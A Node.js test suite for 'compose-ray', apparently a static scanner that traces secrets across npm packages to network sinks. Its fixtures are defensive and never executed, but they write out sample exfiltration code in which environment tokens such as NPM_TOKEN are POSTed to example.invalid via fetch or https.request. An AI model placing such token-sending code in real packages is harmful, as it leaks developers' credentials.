import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { analyzeProject } from '../src/analyze.mjs';

const cli = fileURLToPath(new URL('../bin/compose-ray.mjs', import.meta.url));
const sender = 'module.exports = function send(value) { fetch("https://example.invalid/collect", {method:"POST", body:value}); };';
function fixture(t, { entry = 'const send=require("sender"); send(process.env.NPM_TOKEN);', helper = sender, extra = {}, version = 3 } = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'compose-ray-test-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const write = (file, data) => {
    const target = path.join(root, file);
    fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, typeof data === 'string' ? data : JSON.stringify(data));
  };
  const rootManifest = { name: 'app', version: '1.0.0', dependencies: { sender: '1.0.0' } };
  const lock = { name: 'app', lockfileVersion: version, packages: { '': rootManifest, 'node_modules/sender': { version: '1.0.0' } } };
  write('package.json', rootManifest);
  write('index.js', entry);
  write('node_modules/sender/package.json', { name: 'sender', version: '1.0.0', main: 'index.js' });
  write('node_modules/sender/index.js', helper);
  const addPackage = (location, name, packageVersion, source, manifest = {}) => {
    lock.packages[location] = { version: packageVersion };
    write(`${location}/package.json`, { name, version: packageVersion, main: 'index.js', ...manifest });
    write(`${location}/index.js`, source);
    write('package-lock.json', lock);
  };
  write('package-lock.json', lock);
  for (const [file, data] of Object.entries(extra)) write(file, data);
  return { root, write, lock, addPackage, scan: options => analyzeProject({ root, ...options }) };
}
const hasGap = (report, code) => report.gaps.some(gap => gap.code === code);

test('cross-package finding cites real source, call, sink and locked identities', t => {
  const f = fixture(t);
  const r = f.scan();
  assert.equal(r.verdict, 'review');
  assert.equal(r.coverage, 'complete-for-supported-entry');
  assert.equal(r.findings.length, 1);
  const finding = r.findings[0];
  assert.equal(finding.crossPackage, true);
  assert.deepEqual(finding.trace.map(step => step.kind), ['source', 'call', 'sink']);
  assert.equal(finding.trace[0].label, 'process.env.NPM_TOKEN');
  assert.equal(finding.trace.at(-1).file, 'node_modules/sender/index.js');
  assert.equal(finding.trace.at(-1).package.version, '1.0.0');
  assert.equal(finding.trace[1].target.file, 'node_modules/sender/index.js');
  assert.ok(finding.trace.every(step => step.line === 1 && step.column > 0));
  assert.equal(r.imports[0].to.package.id, 'node_modules/sender');
  assert.ok(r.packages.every(pkg => /^[a-f0-9]{64}$/.test(pkg.analyzedContentSha256)));
  assert.ok(r.packages.every(pkg => pkg.registryIntegrityVerified === false));
});

test('public constant, unused sensitive value, and unused sender do not imply a flow', t => {
  for (const entry of [
    'const send=require("sender"); send("hello");',
    'const token=process.env.NPM_TOKEN; const send=require("sender"); send("hello");',
    'const token=process.env.NPM_TOKEN; const send=require("sender");',
  ]) {
    const r = fixture(t, { entry }).scan();
    assert.equal(r.verdict, 'no-flow-found'); assert.deepEqual(r.findings, []);
  }
});

test('same-package relative import control is detected but not labeled cross-package', t => {
  const f = fixture(t, { entry: 'const send=require("./sender.js"); send(process.env.NPM_TOKEN);', extra: { 'sender.js': sender } });
  const r = f.scan();
  assert.equal(r.verdict, 'review'); assert.equal(r.findings[0].crossPackage, false);
});

test('two nested versions resolve from their callers rather than by package name', t => {
  const f = fixture(t, { entry: 'const relay=require("relay"); relay(process.env.NPM_TOKEN);', helper: 'module.exports = value => undefined;' });
  f.addPackage('node_modules/relay', 'relay', '1.0.0', 'const send=require("sender"); module.exports=value=>send(value);');
  f.addPackage('node_modules/relay/node_modules/sender', 'sender', '2.0.0', sender);
  const r = f.scan();
  assert.equal(r.verdict, 'review');
  assert.equal(r.findings[0].trace.at(-1).package.id, 'node_modules/relay/node_modules/sender');
  assert.equal(r.findings[0].trace.at(-1).package.version, '2.0.0');
  f.write('node_modules/relay/node_modules/sender/index.js', 'module.exports = value => undefined;');
  f.write('node_modules/sender/index.js', sender);
  assert.equal(f.scan().verdict, 'no-flow-found', 'must not substitute the hoisted sender for the nested version');
});

test('hoisted imports, scoped packages, named exports, object taint and return values compose', t => {
  const f = fixture(t, { entry: 'const reader=require("@demo/reader"); const relay=require("relay"); relay(reader.read());', helper: 'exports.send = value => fetch("https://example.invalid", {body:JSON.stringify(value)});' });
  f.addPackage('node_modules/@demo/reader', '@demo/reader', '2.0.0', 'exports.read = () => ({token:process.env.API_TOKEN});');
  f.addPackage('node_modules/relay', 'relay', '3.0.0', 'const sender=require("sender"); module.exports = value => sender.send(value);');
  const r = f.scan();
  assert.equal(r.verdict, 'review');
  assert.equal(r.findings[0].trace[0].package.id, 'node_modules/@demo/reader');
  assert.equal(r.findings[0].trace.at(-1).package.id, 'node_modules/sender');
  assert.ok(r.findings[0].trace.some(step => step.kind === 'return'));
});

test('module-exported secret values retain the import path', t => {
  const f = fixture(t, { entry: 'const secret=require("reader"); const send=require("sender"); send(secret);' });
  f.addPackage('node_modules/reader', 'reader', '1.0.0', 'module.exports = process.env.TOKEN;');
  const r = f.scan();
  assert.equal(r.verdict, 'review');
  assert.ok(r.findings[0].trace.some(step => step.kind === 'import' && step.label === 'reader'));
});

test('HTTP request streams retain sink location', t => {
  const f = fixture(t, { helper: 'const https=require("node:https"); module.exports=value=>{const req=https.request("https://example.invalid"); req.end(value);};' });
  const r = f.scan();
  assert.equal(r.verdict, 'review');
  assert.equal(r.findings[0].trace.at(-1).label, 'node:https.request.end');
});

test('known exact package exports and explicit .cjs entry are supported', t => {
  const f = fixture(t);
  f.write('node_modules/sender/package.json', { name: 'sender', version: '1.0.0', type: 'module', exports: { '.': './send.cjs' } });
  f.write('node_modules/sender/send.cjs', sender);
  assert.equal(f.scan().verdict, 'review');
});

test('package subpaths and legacy directory index resolution work', t => {
  const f = fixture(t, { entry: 'const send=require("sender/lib"); send(process.env.TOKEN);' });
  f.write('node_modules/sender/lib/index.js', sender);
  assert.equal(f.scan().verdict, 'review');
});

test('v2 and v3 lockfiles are accepted, v1 and unresolved versions are incomplete', t => {
  assert.equal(fixture(t, { version: 2 }).scan().verdict, 'review');
  assert.equal(fixture(t, { version: 1 }).scan().verdict, 'incomplete');
  const f = fixture(t);
  f.lock.packages['node_modules/sender'].version = '^1.0.0';
  f.write('package-lock.json', f.lock);
  assert.ok(hasGap(f.scan(), 'unresolved-version'));
});

test('missing source and manifest mismatches never silently clear', t => {
  const f = fixture(t);
  fs.unlinkSync(path.join(f.root, 'node_modules/sender/index.js'));
  assert.ok(hasGap(f.scan(), 'missing-module'));
  f.write('node_modules/sender/index.js', sender);
  f.write('node_modules/sender/package.json', { name: 'sender', version: '9.0.0' });
  assert.ok(hasGap(f.scan(), 'identity-mismatch'));
});

test('missing locked packages are reported even if entry does not import them', t => {
  const f = fixture(t, { entry: 'const value=1;' });
  f.lock.packages['node_modules/missing'] = { version: '1.0.0' };
  f.write('package-lock.json', f.lock);
  assert.equal(f.scan().verdict, 'incomplete');
});

test('unlocked physical package cannot be used in place of a locked dependency', t => {
  const f = fixture(t);
  delete f.lock.packages['node_modules/sender']; f.write('package-lock.json', f.lock);
  assert.ok(hasGap(f.scan(), 'unlocked-package'));
});

test('unsupported exports, ESM, native modules and nested package scopes are incomplete', t => {
  for (const manifest of [{ exports: { import: './index.js', require: './index.js' } }, { type: 'module' }, { main: 'index.node' }]) {
    const f = fixture(t);
    f.write('node_modules/sender/package.json', { name: 'sender', version: '1.0.0', ...manifest });
    f.write('node_modules/sender/index.node', 'not a binary');
    assert.equal(f.scan().verdict, 'incomplete');
  }
  const f = fixture(t, { entry: 'require("sender/lib");' });
  f.write('node_modules/sender/lib/package.json', { type: 'module' });
  f.write('node_modules/sender/lib/index.js', sender);
  assert.ok(hasGap(f.scan(), 'nested-package-scope'));
});

test('unsupported semantics, dynamic require and unknown APIs are incomplete', t => {
  for (const entry of [
    'const x="sender"; require(x);', 'import send from "sender";',
    'if (process.env.TOKEN) fetch("https://example.invalid");',
    'for (;;) {}', 'const object={get token(){return process.env.TOKEN}};',
    'const fs=require("node:fs");', 'eval("1");',
    'const send=require("sender"); send.call(null, process.env.TOKEN);',
    'const {send}=require("sender");', 'let x=1; x=2;',
    'const f=async()=>1;', 'new Function("return 1")();',
    'JSON.stringify({toJSON:()=>fetch("https://example.invalid",{body:process.env.TOKEN})});',
    'const object={toString:()=>fetch("https://example.invalid",{body:process.env.TOKEN})}; const value=""+object;',
    'exports.__proto__={toJSON:()=>fetch("https://example.invalid",{body:process.env.TOKEN})}; JSON.stringify(exports);',
  ]) {
    const r = fixture(t, { entry }).scan();
    assert.equal(r.verdict, 'incomplete', entry);
    assert.ok(r.gaps.length, entry);
  }
});

test('uninitialized bindings are explicit gaps; shadowed builtins are not used', t => {
  const f = fixture(t, { entry: 'fetch("https://example.invalid", {body:token}); const token=process.env.TOKEN;' });
  assert.ok(hasGap(f.scan(), 'uninitialized-binding'));
  const r = fixture(t, { entry: 'const fetch=value=>undefined; fetch(process.env.TOKEN);' }).scan();
  assert.equal(r.verdict, 'no-flow-found');
});

test('state-changing exported functions are incomplete rather than using stale exports', t => {
  const f = fixture(t, {
    entry: 'const lib=require("sender"); lib.change(); lib.send(process.env.TOKEN);',
    helper: 'exports.send=value=>undefined; exports.change=()=>{exports.send=value=>fetch("https://example.invalid",{body:value});};',
  });
  assert.equal(f.scan().verdict, 'incomplete');
  assert.ok(hasGap(f.scan(), 'unsupported-syntax'));
});

test('trace truncation is explicit', t => {
  const f = fixture(t, { entry: 'const send=require("sender"); send(JSON.stringify({a:process.env.A,b:process.env.B}));' });
  const r = f.scan({ limits: { maxTraces: 1 } });
  assert.equal(r.verdict, 'incomplete'); assert.ok(hasGap(r, 'trace-budget'));
  assert.ok(r.findings.length);
});

test('import cycles and recursion terminate with incomplete analysis', t => {
  const f = fixture(t, { helper: 'module.exports=require("./again.js");', extra: { 'node_modules/sender/again.js': 'module.exports=require("./index.js");' } });
  assert.ok(hasGap(f.scan(), 'module-cycle'));
  const r = fixture(t, { helper: 'module.exports=function recur(value){return recur(value)};' }).scan();
  assert.ok(hasGap(r, 'call-cycle'));
});

test('all principal resource budgets fail incomplete', t => {
  for (const limits of [{ maxPackages: 1 }, { maxModules: 1 }, { maxFileBytes: 10 }, { maxLockBytes: 10 }, { maxTotalBytes: 10 }, { maxSteps: 1 }, { maxDepth: 1 }, { maxAstNodes: 1 }]) {
    const r = fixture(t).scan({ limits });
    assert.equal(r.verdict, 'incomplete', JSON.stringify(limits));
    assert.ok(r.gaps.some(gap => /budget/.test(gap.code)), JSON.stringify(r.gaps));
  }
  assert.throws(() => fixture(t).scan({ limits: { maxSteps: 0 } }), /Invalid limit/);
});

test('findings survive an incomplete scan and finding limits are explicit', t => {
  const f = fixture(t, { entry: 'const send=require("sender"); send(process.env.A); send(process.env.B); mystery();' });
  const r = f.scan({ limits: { maxFindings: 1 } });
  assert.equal(r.verdict, 'incomplete'); assert.equal(r.findings.length, 1);
  assert.ok(hasGap(r, 'finding-budget'));
});

test('symlinks, workspace links, traversal, and out-of-package imports are rejected', t => {
  const f = fixture(t);
  const outside = path.join(f.root, 'outside.js'); f.write('outside.js', sender);
  fs.unlinkSync(path.join(f.root, 'node_modules/sender/index.js'));
  fs.symlinkSync(outside, path.join(f.root, 'node_modules/sender/index.js'));
  assert.ok(hasGap(f.scan(), 'unsupported-symlink'));
  f.lock.packages['node_modules/sender'].link = true; f.write('package-lock.json', f.lock);
  assert.ok(hasGap(f.scan(), 'unsupported-link'));
  assert.ok(hasGap(f.scan({ entry: '../outside.js' }), 'unsafe-entry'));
  const escaped = fixture(t, { helper: 'module.exports=require("../../index.js");' }).scan();
  assert.ok(hasGap(escaped, 'cross-boundary-path'));
  f.lock.packages['../outside'] = { version: '1.0.0' }; f.write('package-lock.json', f.lock);
  assert.ok(hasGap(f.scan(), 'unsupported-package-path'));
});

test('malformed input is a structured incomplete result', t => {
  for (const data of ['{', '{}', '{"lockfileVersion":3,"packages":null}', '{"lockfileVersion":3,"packages":{"":{},"node_modules/sender":null}}']) {
    const f = fixture(t); f.write('package-lock.json', data);
    assert.equal(f.scan().verdict, 'incomplete');
  }
  assert.equal(analyzeProject({ root: '/path/that/does/not/exist' }).verdict, 'incomplete');
});

test('evidence digest is stable and changes when analyzed source changes', t => {
  const f = fixture(t);
  const first = f.scan();
  assert.deepEqual(first, f.scan());
  f.write('node_modules/sender/index.js', `${sender}\n// source changed\n`);
  assert.notEqual(first.packages[1].analyzedContentSha256, f.scan().packages[1].analyzedContentSha256);
});

test('target source is never executed', t => {
  const marker = path.join(os.tmpdir(), `compose-ray-must-not-execute-${process.pid}`);
  const f = fixture(t, { entry: `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "executed");` });
  assert.equal(f.scan().verdict, 'incomplete'); assert.equal(fs.existsSync(marker), false);
});

test('CLI exposes JSON and correct review, benign and incomplete exit codes', t => {
  const f = fixture(t);
  const invoke = (...args) => spawnSync(process.execPath, [cli, ...args], { encoding: 'utf8' });
  let run = invoke(f.root, '--json');
  assert.equal(run.status, 1, run.stderr); assert.equal(JSON.parse(run.stdout).verdict, 'review');
  f.write('index.js', 'const send=require("sender"); send("public");');
  run = invoke(f.root, '--json'); assert.equal(run.status, 0);
  f.write('index.js', 'require("unknown");');
  run = invoke(f.root, '--json'); assert.equal(run.status, 2); assert.equal(JSON.parse(run.stdout).verdict, 'incomplete');
  for (const args of [[], [f.root, '--wat'], [f.root, '--entry'], [f.root, '--json', '--json']]) assert.equal(invoke(...args).status, 2);
  assert.equal(invoke('--help').status, 0);
});

test('vendored parser matches recorded provenance hash', () => {
  const folder = new URL('../src/vendor/acorn/', import.meta.url);
  const provenance = JSON.parse(fs.readFileSync(new URL('provenance.json', folder)));
  const hash = createHash('sha256').update(fs.readFileSync(new URL('acorn.cjs', folder))).digest('hex');
  assert.equal(hash, provenance.sha256);
});
